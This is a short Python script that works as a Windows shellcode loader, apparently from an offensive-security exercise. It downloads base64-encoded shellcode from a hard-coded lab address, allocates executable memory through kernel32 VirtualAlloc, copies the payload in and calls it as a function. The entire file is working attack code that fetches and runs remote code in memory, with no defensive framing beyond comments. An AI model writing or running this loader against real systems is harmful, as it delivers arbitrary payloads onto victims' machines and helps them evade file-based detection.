from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    # download the shellcode from the url and decode it from base64
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode
# write shellcode into memory
def write_memory(buf):
    length = len(buf)

    # VirtualAlloc should expect a pointer back
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # provide RtlMoveMemory arguments: pointer, pointer, size
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

    # allocate memoery with read, write, and execute permissions
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    # move the shellcode into the allocated buffer
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    # allocate buffer to hold shellcode
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    # cast the pointer to a function and call it
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # call the shellcode
    shell_func()

if __name__ == '__main__':
    url = 'http://192.168.127.132:8000/shellcode.bin'
    shellcode = get_code(url)
    run(shellcode)